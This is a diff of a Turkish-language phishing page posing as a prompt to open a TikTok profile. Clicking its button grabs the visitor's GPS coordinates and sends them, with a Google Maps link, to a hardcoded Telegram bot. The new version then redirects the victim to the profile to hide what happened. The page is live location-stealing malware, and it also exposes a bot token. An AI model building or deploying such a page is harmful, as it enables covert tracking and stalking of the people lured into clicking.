@@ -1,38 +1,48 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>İçeriğe Ulaş</title>
-  </head>
-  <body>
-    <h2>İçeriğe Ulaş</h2>
-    <button onclick="getLocation()">Tamam</button>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Profili Açmak istiyormusunuz</title>
+</head>
+<body>
+  <h2>Evet</h2>
+  <button id="sendLocationBtn">Evet</button>
 
-    <script>
-      function getLocation() {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(function(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const redirectUrl = params.get('redirect') || "https://www.tiktok.com/@ilayda.yldrm84";
 
-            fetch("https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json"
-              },
-              body: JSON.stringify({
-                chat_id: "6358000072",
-                text: `📍 LAT: ${lat}\n📍 LON: ${lon}\n📍 https://maps.google.com/?q=${lat},${lon}`
-              })
-            }).then(r => r.json())
-              .then(res => alert("Bot yanıtı: " + JSON.stringify(res)))
-              .catch(err => alert("Hata: " + err));
-          }, function(error) {
-            alert("Konum HATASI: " + error.message);
-          });
-        } else {
-          alert("Tarayıcı konum desteklemiyor");
-        }
+    document.getElementById("sendLocationBtn").addEventListener("click", () => {
+      if (!navigator.geolocation) {
+        alert("Tarayıcınız konum desteklemiyor.");
+        return;
       }
-    </script>
-  </body>
+
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        fetch("https://api.telegram.org/bot7906946385:AAE_qvqTw8qxZBkdktkQNrXDM7maV6bdKqA/sendMessage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: "6358000072",
+            text: `📍 Yeni Konum:\nEnlem: ${lat}\nBoylam: ${lon}\nhttps://maps.google.com/?q=${lat},${lon}`
+          })
+        }).then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              alert("Konum başarıyla gönderildi!");
+              window.location.href = redirectUrl;
+            } else {
+              alert("Telegram mesajı gönderilemedi!");
+            }
+          }).catch(() => alert("Bir hata oluştu!"));
+      }, error => {
+        alert("Konum alınamadı: " + error.message);
+      });
+    });
+  </script>
+</body>
 </html>
